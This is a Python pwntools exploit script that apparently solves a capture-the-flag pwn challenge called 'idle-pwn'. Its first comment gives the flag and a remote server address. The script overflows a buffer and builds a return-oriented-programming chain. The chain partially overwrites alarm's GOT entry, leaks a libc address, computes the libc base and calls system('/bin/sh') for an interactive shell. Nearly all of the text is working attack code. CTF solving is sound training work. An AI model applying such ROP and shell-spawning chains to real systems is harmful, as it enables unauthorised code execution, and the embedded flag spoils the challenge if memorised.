# ictf{r3t2DLR3s0lve_D0cumEnT4t10n_FTW!!}
# python exploit.py REMOTE 34.72.43.223 49250
from pwn import *
import time
from Crypto.Util.number import long_to_bytes, bytes_to_long

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break *0x4011e8
continue
'''.format(**locals())
"""
break *0x4011e8
continue
"""

libc = ELF('libc6_2.36-9+deb12u4_amd64.so')

# Set up pwntools for the correct architecture
exe = './idle-pwn'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
# context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

for i in range(256):
    # brute force the required last byte for getting the syscall from alarm function in libc
    if i != 101:
        continue

    print('i = ',i)

    io = start()
    # gdb.attach(io, gdbscript=gdbscript)

    data = 0x404018   # get somewhere at .data section

    # How many bytes to the instruction pointer (EIP)?
    padding = 96-8
    pop_rdi = elf.functions.a.address + 4
    pop_rsi_r15 = elf.functions.b.address + 4


    ret = 0x4011b0
    payload = flat(
        b'A' * padding,
        pop_rdi,
        30,

        elf.functions.init.address+9,
        0,
        elf.functions.main,
    )

    io.send(payload)

    time.sleep(0.5)

    payload = flat(
        b'A' * padding,

        pop_rdi,
        0,

        pop_rsi_r15,
        data,
        0,

        elf.plt['read'],

        pop_rdi,
        0,

        elf.plt['alarm'],

        pop_rdi,
        0,

        pop_rsi_r15,
        elf.got['alarm'],
        0,

        elf.plt['read'],

        pop_rdi,
        1,

        pop_rsi_r15,
        elf.got['alarm'],
        0,

        elf.plt['alarm'],

        elf.functions.main,
        # alarm
        # 0x7f8f822fe540

    )

    time.sleep(0.2)
    io.send(payload)

    time.sleep(0.2)

    io.send(b'/bin/sh\x00\x00')

    time.sleep(0.2)

    io.send(long_to_bytes(i))
    time.sleep(0.2)
    
    libc_alarm_101 = bytes_to_long(io.recv(6)[::-1])
    libc.address = libc_alarm_101 - 5 - libc.symbols['alarm']
    print(hex(libc_alarm_101))
    print('libc base', hex(libc.address))


    payload = flat(
        b'A' * padding,
        pop_rdi,
        data,
        libc.symbols['system'],
    )
    io.send(payload)

    io.interactive()

    continue

    try:
        # this section for brute forcing the last byte of elf.got['alarm'] to get syscall
        #io.interactive()
        res = io.recvall(2)
        if len(res) > 0x80:
            print('i', i, res)
        io.close()
    except:
        io.close()
        continue
